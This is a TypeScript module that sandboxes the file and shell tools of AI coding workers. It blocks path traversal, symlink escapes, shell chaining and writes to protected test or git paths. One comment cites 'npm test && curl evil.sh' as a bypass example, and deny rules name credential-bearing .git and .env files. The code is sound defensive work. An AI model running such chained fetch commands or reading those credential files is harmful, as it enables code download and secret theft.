import fs from 'fs';
import path from 'path';
import { execFileSync } from 'node:child_process';
import { WorkerExecutionContext } from './types.js';
import { SandboxExecutor } from '../sandbox/sandboxExecutor.js';

export interface PathResolutionResult {
  fullPath: string;
  isSafe: boolean;
  isProtected: boolean;
  isAllowed: boolean;
  error?: string;
}

/**
 * Resolves a path relative to the workspace, strictly verifying:
 * 1. Lexical containment (no .. escaping)
 * 2. Intermediate symlink verification (realpath of all existing ancestors)
 * 3. Target symlink verification (realpath of target file)
 * 4. Protected path restrictions
 * 5. Allowed path scope restrictions
 */
export function resolveSafePath(
  realWorktree: string,
  relPath: string,
  context: { allowedPaths?: string[]; protectedPaths?: string[] }
): PathResolutionResult {
  const normalized = path.normalize(relPath).replace(/^(\.\.(\/|\\|$))+/, '');
  const fullPath = path.resolve(realWorktree, normalized);

  // 1. Lexical check
  if (!fullPath.startsWith(realWorktree + path.sep) && fullPath !== realWorktree) {
    return { fullPath, isSafe: false, isProtected: false, isAllowed: false, error: 'Path traversal: lexical escape' };
  }

  // 2. Realpath ancestor verification: ensure no intermediate symlink escapes worktree
  let currentCheck = fullPath;
  while (!fs.existsSync(currentCheck) && currentCheck !== path.dirname(currentCheck)) {
    currentCheck = path.dirname(currentCheck);
  }

  if (fs.existsSync(currentCheck)) {
    try {
      const realAncestor = fs.realpathSync(currentCheck);
      if (!realAncestor.startsWith(realWorktree + path.sep) && realAncestor !== realWorktree) {
        return { fullPath, isSafe: false, isProtected: false, isAllowed: false, error: 'Symlink traversal: intermediate directory escapes workspace' };
      }
    } catch (e: any) {
      return { fullPath, isSafe: false, isProtected: false, isAllowed: false, error: `Realpath resolution failed: ${e.message}` };
    }
  }

  // 3. If target file itself exists, check realpath
  if (fs.existsSync(fullPath)) {
    try {
      const realTarget = fs.realpathSync(fullPath);
      if (!realTarget.startsWith(realWorktree + path.sep) && realTarget !== realWorktree) {
        return { fullPath, isSafe: false, isProtected: false, isAllowed: false, error: 'Symlink escape: target file points outside workspace' };
      }
    } catch (e: any) {
      return { fullPath, isSafe: false, isProtected: false, isAllowed: false, error: `Realpath failed: ${e.message}` };
    }
  }

  // 4. Check protected paths (case-insensitive: the worktree filesystem may be
  // case-insensitive (macOS APFS), so `.GITHUB/...` and `.github/...` are the
  // same directory and both must be treated as protected).
  const relToWorktree = path.relative(realWorktree, fullPath);
  const relLower = relToWorktree.toLowerCase();
  const isProtected = (context.protectedPaths || []).some((pattern) => {
    const clean = pattern.replace(/\*\*?$/, '').toLowerCase();
    return relLower.startsWith(clean) || relLower === clean;
  }) || relLower.startsWith('.git');

  // 5. Check allowed paths (case-insensitive for the same reason).
  const isAllowed = (!context.allowedPaths || context.allowedPaths.length === 0) ||
    context.allowedPaths.some((pattern) => {
      if (pattern === '*' || pattern === '**') return true;
      const clean = pattern.replace(/\*\*?$/, '').toLowerCase();
      return relLower.startsWith(clean) || relLower === clean;
    });

  return {
    fullPath,
    isSafe: true,
    isProtected,
    isAllowed,
  };
}

/**
 * Universal workspace tool definitions for provider coding workers.
 */
export const SHARED_TOOL_SPECS = [
  {
    name: 'list_files',
    description: 'List files in a repository directory relative to workspace root.',
    parameters: {
      type: 'object',
      properties: {
        directory: {
          type: 'string',
          description: 'Relative directory path to list. Omit or pass "" for root.',
        },
      },
    },
  },
  {
    name: 'read_file',
    description: 'Read the text content of a file in the workspace.',
    parameters: {
      type: 'object',
      properties: {
        filePath: {
          type: 'string',
          description: 'Path to file relative to repository root.',
        },
      },
      required: ['filePath'],
    },
  },
  {
    name: 'write_file',
    description: 'Write or overwrite text content to a file in the workspace.',
    parameters: {
      type: 'object',
      properties: {
        filePath: {
          type: 'string',
          description: 'Relative path to file.',
        },
        content: {
          type: 'string',
          description: 'Full UTF-8 text content to write.',
        },
      },
      required: ['filePath', 'content'],
    },
  },
  {
    name: 'run_permitted_command',
    description: 'Run a permitted build or test command in the isolated workspace (e.g., npm test, git status, npx tsx ...).',
    parameters: {
      type: 'object',
      properties: {
        command: {
          type: 'string',
          description: 'Command line string to execute.',
        },
      },
      required: ['command'],
    },
  },
];

/**
 * Formats tool definitions for the Gemini SDK.
 */
export function getGeminiToolDeclarations(): any[] {
  return [
    {
      name: 'list_files',
      description: 'List files in a repository directory relative to workspace root.',
      parameters: {
        type: 'OBJECT',
        properties: {
          directory: { type: 'STRING', description: 'Relative directory path to list. Omit or pass "" for root.' },
        },
      },
    },
    {
      name: 'read_file',
      description: 'Read the text content of a file in the workspace.',
      parameters: {
        type: 'OBJECT',
        properties: {
          filePath: { type: 'STRING', description: 'Path to file relative to repository root.' },
        },
        required: ['filePath'],
      },
    },
    {
      name: 'write_file',
      description: 'Write or overwrite text content to a file in the workspace.',
      parameters: {
        type: 'OBJECT',
        properties: {
          filePath: { type: 'STRING', description: 'Relative path to file.' },
          content: { type: 'STRING', description: 'Full UTF-8 text content to write.' },
        },
        required: ['filePath', 'content'],
      },
    },
    {
      name: 'run_permitted_command',
      description: 'Run a permitted build or test command in the isolated workspace (e.g., npm test, git status, npx tsx ...).',
      parameters: {
        type: 'OBJECT',
        properties: {
          command: { type: 'STRING', description: 'Command line string to execute.' },
        },
        required: ['command'],
      },
    },
  ];
}

/**
 * Formats tool definitions for OpenAI Responses API.
 */
export function getOpenAIToolDeclarations(): any[] {
  return SHARED_TOOL_SPECS.map((spec) => ({
    type: 'function',
    name: spec.name,
    description: spec.description,
    parameters: spec.parameters,
  }));
}

export const PERMITTED_COMMAND_BINARIES = ['npm', 'npx', 'git', 'node', 'tsc', 'echo', 'ls', 'cat'];

/**
 * Quote-aware validation of a shell command line before it reaches
 * `/bin/sh -c` inside the sandbox. The binary allowlist alone is decorative:
 * `npm test && curl evil.sh` or `git status; <anything>` passes a first-token
 * check. This scan rejects chaining, redirection, and substitution operators
 * outside single quotes:
 * - Inside single quotes everything is literal (the only safe zone).
 * - Inside double quotes `; | & < >` are literal, but `$` and backticks
 *   substitute, so they are rejected there too.
 * It also refuses commands that reference `.git` metadata or `git config` /
 * `git remote`, whose output commonly carries embedded credentials
 * (e.g. `https://user:token@host` remotes) and would otherwise be persisted
 * into worker transcripts. (A single-quoted `node -e '...'` payload is not
 * catchable at this layer; the sandbox profile is the boundary for that.)
 */
export function validatePermittedCommand(cmd: string): { ok: boolean; reason?: string } {
  // `visible` accumulates everything sh treats as literal text outside single
  // quotes (scanned for credential-bearing paths); `structural` accumulates
  // only characters outside any quotes (scanned for shell operators).
  let visible = '';
  let structural = '';
  let single = false;
  let double = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (single) {
      if (c === "'") single = false;
      else visible += c;
      continue;
    }
    if (single === false && double) {
      if (c === '"') {
        double = false;
        visible += '"';
      } else if (c === '$' || c === '`') {
        return { ok: false, reason: 'Command substitution ($) is not permitted inside double quotes.' };
      } else {
        // `; | & < >` are literal inside double quotes.
        visible += c;
      }
      continue;
    }
    if (c === "'") {
      single = true;
      continue;
    }
    if (c === '"') {
      double = true;
      visible += '"';
      continue;
    }
    if (c === '\\') {
      i++;
      if (i < cmd.length) {
        visible += cmd[i];
        structural += cmd[i];
      }
      continue;
    }
    visible += c;
    structural += c;
  }
  if (single || double) {
    return { ok: false, reason: 'Unterminated quote in command.' };
  }

  for (const ch of structural) {
    if (';|&<>\n\r`'.includes(ch)) {
      return { ok: false, reason: `Shell operator "${ch}" is not permitted outside quotes.` };
    }
  }
  // Variable expansion in unquoted text is rejected: expanded values bypass the
  // literal scan entirely.
  if (structural.includes('$')) {
    return { ok: false, reason: 'Variable expansion ($) is not permitted outside quotes.' };
  }

  const tokens = visible.trim().split(/\s+/);
  const firstToken = tokens[0] || '';
  if (!PERMITTED_COMMAND_BINARIES.includes(firstToken)) {
    return {
      ok: false,
      reason: `Command "${firstToken}" is not in the permitted sandbox command allowlist (${PERMITTED_COMMAND_BINARIES.join(', ')}).`,
    };
  }
  if (firstToken === 'git') {
    const second = tokens[1] || '';
    if (second === 'config' || second === 'remote') {
      return { ok: false, reason: `git ${second} is not permitted: git configuration and remote URLs can carry embedded credentials.` };
    }
  }
  if (/\.git(?:[/\s"']|$)/.test(visible)) {
    return { ok: false, reason: 'Commands must not access .git metadata (config files there can carry embedded credentials).' };
  }
  return { ok: true };
}

/**
 * Executes a tool in the context of the current task run and worktree.
 * Implements strict security guardrails identical across all model providers.
 */
export async function executeWorkspaceTool(
  context: WorkerExecutionContext,
  name: string,
  args: Record<string, any>,
  sandbox: SandboxExecutor,
  log: (msg: string) => void = () => {}
): Promise<any> {
  const realWorktree = fs.realpathSync(context.worktreePath);
  log(`Tool call invoked: ${name}(${JSON.stringify(args)})`);

  if (name === 'list_files') {
    const targetDir = args.directory ? resolveSafePath(realWorktree, args.directory, context).fullPath : realWorktree;
    if (!targetDir.startsWith(realWorktree) || !fs.existsSync(targetDir)) {
      return { error: `Directory not found or escapes workspace: ${args.directory}` };
    }
    const entries = fs.readdirSync(targetDir, { withFileTypes: true })
      .filter((e) => e.name !== '.git' && e.name !== 'node_modules')
      .map((e) => ({ name: e.name, isDirectory: e.isDirectory() }));
    return { directory: path.relative(realWorktree, targetDir) || '.', entries };
  }

  if (name === 'read_file') {
    const check = resolveSafePath(realWorktree, args.filePath, context);
    if (!check.isSafe) {
      return { error: check.error || `File access blocked: ${args.filePath}` };
    }
    // Git metadata and environment files are denied for reads before the
    // existence check: .git/config frequently carries embedded remote
    // credentials and .env* files hold host secrets. Their content would flow
    // into model context and persist in plaintext worker transcripts.
    const relForRead = path.relative(realWorktree, check.fullPath);
    const relForReadLower = relForRead.toLowerCase();
    if (relForReadLower.startsWith('.git') || relForReadLower === '.git') {
      return { error: `Read rejected: ${args.filePath} is git metadata (.git) and cannot be read by the worker.` };
    }
    if (/(^|\/)\.env/.test(relForRead)) {
      return { error: `Read rejected: ${args.filePath} is an environment file (.env*) and cannot be read by the worker.` };
    }
    if (!fs.existsSync(check.fullPath)) {
      return { error: `File not found: ${args.filePath}` };
    }
    try {
      const content = fs.readFileSync(check.fullPath, 'utf-8');
      return { filePath: args.filePath, content };
    } catch (err: any) {
      return { error: `Failed to read file: ${err.message}` };
    }
  }

  if (name === 'write_file') {
    const check = resolveSafePath(realWorktree, args.filePath, context);
    if (!check.isSafe) {
      return { error: check.error || `Path traversal rejected: ${args.filePath}` };
    }
    if (check.isProtected) {
      return { error: `Write rejected: ${args.filePath} is a protected path (e.g. test criteria or git metadata) and cannot be modified by the worker.` };
    }
    if (!check.isAllowed) {
      return { error: `Write rejected: ${args.filePath} is outside the allowed change scope for this task.` };
    }

    try {
      fs.mkdirSync(path.dirname(check.fullPath), { recursive: true });
      // Use O_NOFOLLOW to prevent following any symlink during file writing
      let fd: number;
      try {
        fd = fs.openSync(
          check.fullPath,
          fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_TRUNC | fs.constants.O_NOFOLLOW
        );
      } catch (openErr: any) {
        if (openErr.code === 'ELOOP' || openErr.code === 'SYMLINK_LOOP') {
          return { error: `Write blocked: ${args.filePath} is a symlink. Writing to symlinks is forbidden.` };
        }
        throw openErr;
      }
      fs.writeFileSync(fd, args.content ?? '', 'utf-8');
      fs.closeSync(fd);
      const byteLength = Buffer.byteLength(args.content ?? '', 'utf-8');
      log(`File written successfully: ${args.filePath} (${byteLength} bytes)`);
      return { filePath: args.filePath, written: true, bytes: byteLength };
    } catch (err: any) {
      return { error: `Failed to write file: ${err.message}` };
    }
  }

  if (name === 'run_permitted_command') {
    const cmd = args.command;
    if (!cmd || typeof cmd !== 'string') {
      return { error: 'Command argument is required and must be a string.' };
    }
    const validation = validatePermittedCommand(cmd);
    if (!validation.ok) {
      return { error: `Command rejected: ${validation.reason}` };
    }

    const res = await sandbox.execute({
      worktreePath: realWorktree,
      command: cmd,
      timeoutMs: args.timeoutMs || 30000,
      runId: context.runId,
      abortSignal: context.abortSignal,
    });

    // Independent protected paths enforcement: verify command did not tamper with protected paths
    try {
      const changedFiles = execFileSync('git', ['status', '--porcelain'], {
        cwd: realWorktree,
        encoding: 'utf-8',
      })
        .split('\n')
        .map((line) => {
          const match = line.match(/^..\s+(.*)$/);
          return match ? match[1].trim() : '';
        })
        .filter(Boolean);

      for (const changed of changedFiles) {
        const changedLower = changed.toLowerCase();
        const isProtected = (context.protectedPaths || []).some((p) => {
          const clean = p.replace(/\*\*?$/, '').toLowerCase();
          return changedLower.startsWith(clean) || changedLower === clean;
        }) || changedLower.startsWith('.git');

        if (isProtected) {
          // Rollback the protected file modification
          try {
            execFileSync('git', ['checkout', 'HEAD', '--', changed], { cwd: realWorktree, stdio: 'pipe' });
          } catch {
            // if untracked, remove
            fs.rmSync(path.resolve(realWorktree, changed), { force: true, recursive: true });
          }
          return {
            command: cmd,
            exitCode: 1,
            stdout: res.stdout,
            stderr: `Integrity violation: Command modified protected path "${changed}". Modifications were automatically rolled back.`,
            durationMs: res.durationMs,
          };
        }
      }
    } catch {
      // ignore status probe error
    }

    log(`Command "${cmd}" finished with exit code ${res.exitCode}`);
    return {
      command: cmd,
      exitCode: res.exitCode,
      stdout: res.stdout.slice(0, 4000), // bounded size
      stderr: res.stderr.slice(0, 4000),
      durationMs: res.durationMs,
    };
  }

  return { error: `Unknown tool: ${name}` };
}
